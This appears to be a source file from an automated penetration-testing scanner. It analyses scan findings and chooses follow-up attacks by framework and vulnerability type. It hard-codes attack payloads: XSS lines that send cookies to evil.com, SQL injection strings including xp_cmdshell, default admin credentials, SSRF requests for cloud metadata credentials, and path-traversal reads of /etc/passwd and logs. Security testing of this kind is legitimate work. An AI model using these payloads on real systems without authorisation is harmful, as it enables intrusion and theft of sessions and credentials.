import { Finding, Severity } from '../../types';
import { getAI } from '../../services/ai.service';
import { getTechniquesForFramework, generateAttackPlan, getAllTechniques, ContextualAttackPlan } from './exploitKnowledgeBase';
import logger from '../../utils/logger';

// ─── ADAPTIVE REASONING ENGINE ──────────────────────────────────────────────
// Inspired by xOffense/VulnBot Penetration Task Graph (PTG) approach.
// After each batch of modules, the reasoning engine:
//   1. Analyzes what was found
//   2. Identifies gaps in coverage
//   3. Generates targeted follow-up attacks
//   4. Adjusts strategy based on what's working

export interface AdaptiveStrategy {
  phase: 'recon' | 'analysis' | 'exploitation' | 'pivot' | 'verify';
  reasoning: string;
  nextModules: string[];
  customPayloads: { endpoint: string; payloads: string[]; reason: string }[];
  focusAreas: string[];
  skipAreas: string[];
  confidence: number;
}

export interface MidScanDecision {
  strategy: AdaptiveStrategy;
  insights: { title: string; description: string; severity: string }[];
  targetAdjustments: { path: string; reason: string }[];
}

// ─── PATTERN DETECTION ──────────────────────────────────────────────────────

function detectPatterns(findings: Finding[]): {
  framework: string;
  hasAdmin: boolean;
  hasAPI: boolean;
  hasSQLi: boolean;
  hasXSS: boolean;
  hasSSRF: boolean;
  hasLFI: boolean;
  hasAuthBypass: boolean;
  hasRCE: boolean;
  openPorts: number[];
  exposedServices: string[];
  sensitiveData: boolean;
  wafDetected: boolean;
} {
  const allText = findings.map(f => `${f.title} ${f.description} ${f.evidence || ''}`).join(' ').toLowerCase();

  // Framework detection
  let framework = 'unknown';
  if (allText.includes('laravel') || allText.includes('illuminate')) framework = 'laravel';
  else if (allText.includes('django') || allText.includes('csrfmiddlewaretoken')) framework = 'django';
  else if (allText.includes('express') || allText.includes('x-powered-by: express')) framework = 'express';
  else if (allText.includes('next.js') || allText.includes('__next')) framework = 'nextjs';
  else if (allText.includes('spring') || allText.includes('springframework')) framework = 'spring';
  else if (allText.includes('rails') || allText.includes('ruby on rails')) framework = 'rails';
  else if (allText.includes('wordpress') || allText.includes('wp-content')) framework = 'wordpress';
  else if (allText.includes('flask') || allText.includes('werkzeug')) framework = 'flask';
  else if (allText.includes('php') || allText.includes('x-powered-by: php')) framework = 'php';
  else if (allText.includes('asp.net') || allText.includes('x-aspnet')) framework = 'aspnet';

  // Feature detection
  const hasAdmin = allText.includes('admin') && (allText.includes('panel') || allText.includes('login') || allText.includes('interface'));
  const hasAPI = allText.includes('api') && (allText.includes('endpoint') || allText.includes('json') || allText.includes('rest'));
  const hasSQLi = allText.includes('sql injection') || allText.includes('sqli');
  const hasXSS = allText.includes('xss') || allText.includes('cross-site scripting');
  const hasSSRF = allText.includes('ssrf') || allText.includes('server-side request');
  const hasLFI = allText.includes('path traversal') || allText.includes('lfi') || allText.includes('file inclusion');
  const hasAuthBypass = allText.includes('auth') && (allText.includes('bypass') || allText.includes('weak') || allText.includes('default'));
  const hasRCE = allText.includes('command injection') || allText.includes('rce') || allText.includes('remote code');
  const sensitiveData = allText.includes('password') || allText.includes('secret') || allText.includes('credential') || allText.includes('api key');
  const wafDetected = allText.includes('waf') || allText.includes('cloudflare') || allText.includes('akamai') || allText.includes('incapsula');

  // Port detection
  const openPorts: number[] = [];
  const portMatches = allText.match(/port\s+(\d+)/g) || [];
  for (const m of portMatches) {
    const port = parseInt(m.replace('port ', ''));
    if (port > 0 && port < 65536) openPorts.push(port);
  }

  const exposedServices: string[] = [];
  if (allText.includes('mysql')) exposedServices.push('mysql');
  if (allText.includes('postgresql') || allText.includes('postgres')) exposedServices.push('postgresql');
  if (allText.includes('redis')) exposedServices.push('redis');
  if (allText.includes('mongodb') || allText.includes('mongo')) exposedServices.push('mongodb');
  if (allText.includes('elasticsearch')) exposedServices.push('elasticsearch');
  if (allText.includes('memcached')) exposedServices.push('memcached');

  return {
    framework, hasAdmin, hasAPI, hasSQLi, hasXSS, hasSSRF, hasLFI,
    hasAuthBypass, hasRCE, openPorts, exposedServices, sensitiveData, wafDetected,
  };
}

// ─── STRATEGY GENERATION ────────────────────────────────────────────────────

function generateStrategy(
  patterns: ReturnType<typeof detectPatterns>,
  allFindings: Finding[],
  completedModules: string[],
): AdaptiveStrategy {
  const focusAreas: string[] = [];
  const skipAreas: string[] = [];
  const customPayloads: AdaptiveStrategy['customPayloads'] = [];

  // If we found admin panels, focus on auth bypass
  if (patterns.hasAdmin) {
    focusAreas.push('admin-panels', 'authentication-bypass');
    customPayloads.push({
      endpoint: '/admin',
      payloads: ['admin:admin', 'admin:password', 'admin:123456', 'root:root', 'admin:'],
      reason: 'Admin panel detected - testing default credentials',
    });
  }

  // If we found SQLi, dig deeper
  if (patterns.hasSQLi) {
    focusAreas.push('sql-injection-deep', 'database-extraction');
    customPayloads.push({
      endpoint: '(discovered SQLi endpoints)',
      payloads: [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT username,password,NULL FROM users--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)--",
        "'; EXEC xp_cmdshell('whoami')--",
      ],
      reason: 'SQL injection detected - attempting data extraction and privilege escalation',
    });
  }

  // If we found XSS, check for stored XSS and session hijacking
  if (patterns.hasXSS) {
    focusAreas.push('stored-xss', 'session-hijacking');
    customPayloads.push({
      endpoint: '(all input points)',
      payloads: [
        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
        '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">',
        '{{constructor.constructor("return this")().alert(1)}}',
      ],
      reason: 'XSS detected - testing for stored XSS and cookie exfiltration',
    });
  }

  // If we found SSRF, pivot to internal network
  if (patterns.hasSSRF) {
    focusAreas.push('ssrf-pivot', 'internal-network', 'cloud-metadata');
    customPayloads.push({
      endpoint: '(SSRF endpoints)',
      payloads: [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://127.0.0.1:6379/INFO',
        'http://127.0.0.1:3306/',
        'gopher://127.0.0.1:6379/_INFO',
      ],
      reason: 'SSRF detected - pivoting to internal services and cloud metadata',
    });
  }

  // If we found LFI, try log poisoning and RCE
  if (patterns.hasLFI) {
    focusAreas.push('lfi-to-rce', 'log-poisoning');
    customPayloads.push({
      endpoint: '(LFI endpoints)',
      payloads: [
        '../../../proc/self/environ',
        '../../../var/log/apache2/access.log',
        '../../../var/log/nginx/access.log',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
      ],
      reason: 'LFI detected - attempting log poisoning and RCE',
    });
  }

  // Framework-specific follow-ups
  if (patterns.framework === 'laravel') {
    focusAreas.push('laravel-env', 'laravel-debug', 'laravel-ignition');
    customPayloads.push({
      endpoint: '/.env',
      payloads: ['/.env', '/.env.backup', '/.env.local', '/storage/logs/laravel.log'],
      reason: 'Laravel detected - checking for .env and log exposure',
    });
  }

  if (patterns.framework === 'spring') {
    focusAreas.push('spring-actuator', 'spel-injection');
    customPayloads.push({
      endpoint: '/actuator',
      payloads: ['/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/configprops'],
      reason: 'Spring detected - enumerating actuator endpoints',
    });
  }

  if (patterns.framework === 'express' || patterns.framework === 'nextjs') {
    focusAreas.push('prototype-pollution', 'nodejs-rce');
    customPayloads.push({
      endpoint: '/api',
      payloads: [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
      ],
      reason: 'Node.js detected - testing prototype pollution',
    });
  }

  // If sensitive data was found, look for more
  if (patterns.sensitiveData) {
    focusAreas.push('data-exposure', 'credential-stuffing');
  }

  // Skip areas based on what's already been tested
  if (completedModules.includes('exploitation') && patterns.hasSQLi) {
    skipAreas.push('basic-sqli');
  }
  if (completedModules.includes('exploitation') && patterns.hasXSS) {
    skipAreas.push('basic-xss');
  }

  // Determine next modules based on focus areas
  const nextModules: string[] = [];
  if (focusAreas.includes('admin-panels') && !completedModules.includes('brokenAuth')) {
    nextModules.push('brokenAuth');
  }
  if (focusAreas.includes('sql-injection-deep') && !completedModules.includes('exploitation')) {
    nextModules.push('exploitation');
  }
  if (focusAreas.includes('ssrf-pivot') && !completedModules.includes('cloudSecurity')) {
    nextModules.push('cloudSecurity');
  }
  if (focusAreas.includes('laravel-env') && !completedModules.includes('webConfig')) {
    nextModules.push('webConfig');
  }
  if (focusAreas.includes('spring-actuator') && !completedModules.includes('serviceAudit')) {
    nextModules.push('serviceAudit');
  }

  // Determine phase
  let phase: AdaptiveStrategy['phase'] = 'analysis';
  if (focusAreas.length === 0) phase = 'verify';
  else if (focusAreas.some(a => a.includes('exploitation') || a.includes('rce') || a.includes('pivot'))) phase = 'exploitation';
  else if (focusAreas.some(a => a.includes('pivot') || a.includes('internal'))) phase = 'pivot';
  else phase = 'exploitation';

  const confidence = Math.min(0.95, 0.5 + (allFindings.length * 0.02) + (focusAreas.length * 0.05));

  return {
    phase,
    reasoning: `Adaptive analysis: ${focusAreas.length > 0 ? `focusing on ${focusAreas.join(', ')}` : 'verification phase'}. ` +
      `Framework: ${patterns.framework}. WAF: ${patterns.wafDetected ? 'detected' : 'none'}. ` +
      `${customPayloads.length} custom payload sets generated.`,
    nextModules,
    customPayloads,
    focusAreas,
    skipAreas,
    confidence,
  };
}

// ─── MAIN ADAPTIVE REASONING ────────────────────────────────────────────────

export async function adaptiveReason(
  domain: string,
  allFindings: Finding[],
  completedModules: string[],
): Promise<MidScanDecision> {
  const startTime = Date.now();
  logger.info(`[AdaptiveReasoning] Analyzing ${allFindings.length} findings from ${completedModules.length} completed modules`);

  // 1. Detect patterns from existing findings
  const patterns = detectPatterns(allFindings);
  logger.info(`[AdaptiveReasoning] Patterns: framework=${patterns.framework}, admin=${patterns.hasAdmin}, api=${patterns.hasAPI}, sql=${patterns.hasSQLi}, xss=${patterns.hasXSS}, ssrf=${patterns.hasSSRF}`);

  // 2. Generate adaptive strategy
  const strategy = generateStrategy(patterns, allFindings, completedModules);

  // 3. Generate insights
  const insights: MidScanDecision['insights'] = [];

  if (patterns.framework !== 'unknown') {
    insights.push({
      title: `Framework Identified: ${patterns.framework}`,
      description: `Target runs ${patterns.framework}. ${strategy.customPayloads.length} framework-specific attack paths generated.`,
      severity: 'INFO',
    });
  }

  if (patterns.hasAdmin) {
    insights.push({
      title: 'Admin Panel Discovered',
      description: 'Administrative interface detected. Testing for authentication bypass and default credentials.',
      severity: 'HIGH',
    });
  }

  if (patterns.hasSQLi) {
    insights.push({
      title: 'SQL Injection Chain Opportunity',
      description: 'SQL injection detected. Attempting database enumeration, data extraction, and privilege escalation.',
      severity: 'CRITICAL',
    });
  }

  if (patterns.hasSSRF) {
    insights.push({
      title: 'SSRF Pivot Opportunity',
      description: 'SSRF detected. Pivoting to internal services, cloud metadata, and databases.',
      severity: 'CRITICAL',
    });
  }

  if (patterns.wafDetected) {
    insights.push({
      title: 'WAF Detected - Evasion Required',
      description: 'Web Application Firewall detected. Using obfuscation and encoding bypass techniques.',
      severity: 'MEDIUM',
    });
  }

  if (patterns.sensitiveData) {
    insights.push({
      title: 'Sensitive Data Exposure',
      description: 'Passwords, API keys, or credentials detected in responses. Expanding search for data leaks.',
      severity: 'HIGH',
    });
  }

  // 4. Generate target adjustments (new paths to test based on findings)
  const targetAdjustments: MidScanDecision['targetAdjustments'] = [];
  if (patterns.framework === 'laravel') {
    targetAdjustments.push(
      { path: '/.env', reason: 'Laravel .env file may contain credentials' },
      { path: '/_ignition/execute-solution', reason: 'Laravel Ignition RCE' },
      { path: '/storage/logs/laravel.log', reason: 'Laravel log may leak sensitive info' },
    );
  }
  if (patterns.framework === 'spring') {
    targetAdjustments.push(
      { path: '/actuator/env', reason: 'Spring Actuator env endpoint' },
      { path: '/actuator/heapdump', reason: 'Spring heap dump may contain secrets' },
    );
  }
  if (patterns.framework === 'wordpress') {
    targetAdjustments.push(
      { path: '/wp-json/wp/v2/users', reason: 'WordPress user enumeration' },
      { path: '/xmlrpc.php', reason: 'WordPress XML-RPC brute force' },
    );
  }

  const duration = Date.now() - startTime;
  logger.info(`[AdaptiveReasoning] Strategy generated in ${duration}ms: ${strategy.phase} phase, ${strategy.nextModules.length} follow-up modules, ${strategy.customPayloads.length} custom payload sets`);

  return { strategy, insights, targetAdjustments };
}
